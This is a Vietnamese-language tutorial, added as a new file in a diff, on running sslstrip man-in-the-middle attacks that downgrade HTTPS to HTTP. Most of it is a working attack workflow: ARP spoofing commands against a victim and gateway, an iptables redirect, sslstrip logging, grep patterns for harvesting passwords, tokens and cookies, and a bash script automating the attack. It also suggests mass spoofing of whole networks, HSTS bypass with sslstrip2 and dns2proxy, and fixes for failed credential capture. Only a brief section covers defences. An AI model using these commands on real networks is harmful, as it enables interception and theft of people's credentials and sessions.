@@ -1,0 +1,160 @@
+1. sslstrip là gì?
+
+    sslstrip là công cụ MITM tấn công “downgrade” từ HTTPS → HTTP, cho phép attacker chuyển traffic của victim từ HTTPS thành HTTP để sniff, đánh cắp credential, session, cookie, v.v.
+
+    Khi nạn nhân click vào link HTTP, sslstrip tự động chuyển hướng mọi nỗ lực truy cập HTTPS thành HTTP (nếu không có HSTS), giúp attacker dễ dàng đọc/gửi/chỉnh sửa traffic.
+
+    Rất hiệu quả với những hệ thống/web/app chưa bật HSTS hoặc người dùng truy cập HTTP.
+
+2. Cài đặt sslstrip
+A. Ubuntu/Kali/Debian
+
+sudo apt update
+sudo apt install sslstrip
+
+    Hoặc bản mới nhất từ github:
+
+    git clone https://github.com/moxie0/sslstrip.git
+    cd sslstrip
+    sudo python2 setup.py install
+
+    sslstrip yêu cầu Python 2.x
+
+3. Lý thuyết tấn công sslstrip
+
+    Victim truy cập http://example.com
+
+    Attacker MITM (dùng arpspoof, ettercap, bettercap, rogue AP) → redirect mọi traffic 443 sang sslstrip (port 8080)
+
+    sslstrip chuyển mọi HTTPS link sang HTTP, mọi request HTTP sẽ gửi về attacker → attacker sniff toàn bộ nội dung.
+
+4. Workflow thực chiến sslstrip
+A. MITM victim bằng arpspoof/ettercap/bettercap
+
+Bước 1: Tìm IP gateway, interface
+
+ip a
+ip route
+
+Ví dụ:
+
+    Attacker: 192.168.1.100
+
+    Gateway: 192.168.1.1
+
+    Victim: 192.168.1.50
+
+Bước 2: Chạy ARP spoof (2 tab)
+
+sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
+
+Bước 3: Bật IP forwarding trên attacker
+
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+B. Redirect port 80 về sslstrip (iptables)
+
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+(Một số guide redirect cả 443 về 8080, nhưng chỉ cần 80 → 8080 là đủ, vì sslstrip chỉ phục vụ HTTP!)
+C. Chạy sslstrip
+
+sudo sslstrip -l 8080 -w log.txt
+
+    -l: Lắng nghe trên port (mặc định 8080)
+
+    -w: Ghi log plaintext
+
+D. Theo dõi/grep password trong log
+
+grep -i "pass\|user\|token\|cookie\|session" log.txt
+
+5. Bypass HSTS, nâng cao với sslstrip2
+
+    sslstrip cổ điển không qua được HSTS (browser sẽ ép dùng HTTPS từ đầu, không cho phép HTTP fallback).
+
+    sslstrip2 + dns2proxy:
+
+        sslstrip2 nâng cấp sẽ chặn HSTS bằng cách fake DNS, trick browser quên HSTS policy.
+
+        https://github.com/moxie0/sslstrip/pull/55
+
+Workflow:
+
+    Dùng dns2proxy để MITM/fake DNS, lừa browser quên HSTS.
+
+    Chạy sslstrip2 với tùy chọn --hsts.
+
+6. Automation, scripting, mass attack
+
+    Script kết hợp arpspoof + sslstrip + iptables tự động:
+
+    #!/bin/bash
+    iface=eth0
+    victim=192.168.1.50
+    gateway=192.168.1.1
+
+    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+    sudo arpspoof -i $iface -t $victim $gateway &
+    sudo arpspoof -i $iface -t $gateway $victim &
+    sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+    sudo sslstrip -l 8080 -w log.txt
+
+    Mass ARP spoof toàn mạng, nhiều victim (script loop với nmap/netdiscover).
+
+7. Phối hợp với các tool nâng cao
+
+    Bettercap: MITM, fake DNS, tích hợp sẵn sslstrip mode (module proxy.https.force_off, proxy.sslstrip).
+
+    Ettercap: MITM toàn mạng, GUI/TUI, filter HTTP, hỗ trợ sslstrip qua plugin.
+
+    mitmproxy: MITM mọi giao thức, automation, script Python, nhưng không “strip” thô kiểu sslstrip.
+
+8. Fix lỗi thực tế
+Lỗi	Cách xử lý
+Victim không bị strip HTTPS	Trang dùng HSTS, browser nhớ policy, phải dùng sslstrip2 + dns2proxy
+Không log được password	Trang chỉ dùng HTTPS từ đầu, phải tấn công victim khi họ click link HTTP
+Log không ra data	Sai interface, chưa ARP spoof thành công, iptables chưa đúng, log file bị permission
+Lỗi python/sslstrip	Dùng Python 2.x, update sslstrip, cài module cần thiết
+Không redirect được traffic	Kiểm tra lại iptables, test bằng curl/capture trên victim
+9. Phòng chống sslstrip/MITM
+
+    Luôn dùng HSTS, preload HSTS trên browser
+
+    Luôn truy cập https://, không dùng http://
+
+    Không trust mạng công cộng, bật VPN
+
+    Cảnh báo người dùng khi có lỗi cert, hoặc HTTP downgrade
+
+    Monitor ARP/DNS spoof trên hệ thống (arpwatch, xarp, IDS)
+
+10. So sánh sslstrip với các công cụ MITM khác
+Tool	Ưu điểm sslstrip	Khác biệt
+sslstrip	Nhẹ, nhanh, script tốt, sniff HTTP thô	Không qua được HSTS, không sửa nội dung
+sslstrip2	Qua được HSTS với dns2proxy, stealth hơn	Cần phối hợp nhiều tool, phức tạp hơn
+bettercap	MITM automation, sniff mọi giao thức, fake DNS, inject code	Nặng hơn, nhiều tính năng, có thể phức tạp cho beginner
+mitmproxy	MITM mọi traffic, sửa request/response, script mạnh	Không strip HTTPS, cần CA import, không log raw
+sslsniff	MITM HTTPS thực thụ, log raw, stealth	Không “strip” HTTPS thành HTTP, chỉ sniff MITM, yêu cầu CA
+11. Tài liệu, link hữu ích
+
+    sslstrip GitHub
+
+    PayloadAllTheThings – MITM
+
+    Hacktricks – HTTPS Interception
+
+    sslstrip2
+
+    dns2proxy
+
+    Bettercap
+
+Tóm tắt nhanh
+
+    sslstrip: tool MITM classic, “downgrade” HTTPS về HTTP để sniff password, credential, session trên mạng nội bộ/public, cực mạnh khi hệ thống chưa bật HSTS.
+
+    Kết hợp arpspoof/ettercap/bettercap/sslstrip2/dns2proxy để tấn công nâng cao, mass sniffing, automation, forensic, demo tấn công mạng thực tế.
+
+    Hiện tại, HSTS và HTTPS phổ biến đã giảm hiệu quả sslstrip, nhưng vẫn cực mạnh cho training, CTF, forensic, lab, hoặc mạng legacy chưa bảo mật chuẩn.
